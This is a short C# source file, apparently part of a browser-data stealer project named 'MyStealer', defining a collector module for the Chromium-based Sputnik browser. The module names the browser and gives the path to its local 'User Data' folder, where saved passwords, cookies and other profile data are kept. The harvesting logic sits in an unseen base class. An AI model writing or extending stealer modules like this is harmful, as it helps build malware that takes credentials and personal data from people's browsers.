using System.IO;
using System;

namespace MyStealer.Collector.Browser.ChromiumBased
{
    public class Sputnik : Chromium
    {
        public override string ModuleName => "Sputnik";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Sputnik", "Sputnik", "User Data");
    }
}
